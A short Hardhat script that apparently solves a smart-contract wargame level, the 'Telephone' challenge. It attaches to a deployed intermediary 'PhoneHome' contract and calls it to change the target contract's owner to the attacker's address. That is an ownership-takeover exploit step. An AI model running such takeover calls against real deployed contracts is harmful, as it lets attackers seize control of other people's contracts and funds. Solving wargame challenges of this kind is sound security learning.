//Below is the hardhat script implemnentation to call our PhoneHome.sol contract which calls Telephone.sol

const main = async () => {
    // Set up an ethers contract, representing our deployed PhoneHome instance
    const address = '0x84B951FE630d608a449068fa4847BE30200d2143';
    const PhoneHome = await ethers.getContractFactory('PhoneHome');
    const pH = await PhoneHome.attach(address);
    
   //change owner to our address
    await pH.phoneHome("0x42b0b379d254f6a05c0aA9152199213bfB967B28");
    
    
  };
  
  const runMain = async () => {
    try {
      await main();
      process.exit(0);
    } catch (error) {
      console.log(error);
      process.exit(1);
    }
  };
  
  runMain();
